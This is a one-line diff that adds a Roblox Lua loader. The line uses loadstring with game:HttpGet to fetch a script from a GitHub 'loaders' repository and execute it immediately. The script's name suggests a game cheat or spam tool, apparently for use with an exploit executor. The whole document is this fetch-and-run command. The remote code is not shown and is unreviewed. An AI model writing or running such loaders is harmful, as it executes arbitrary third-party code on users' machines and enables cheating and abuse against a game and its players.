@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/sell-fries-anomaly-spam6-sai4osn1fbcv0z.lua"))()
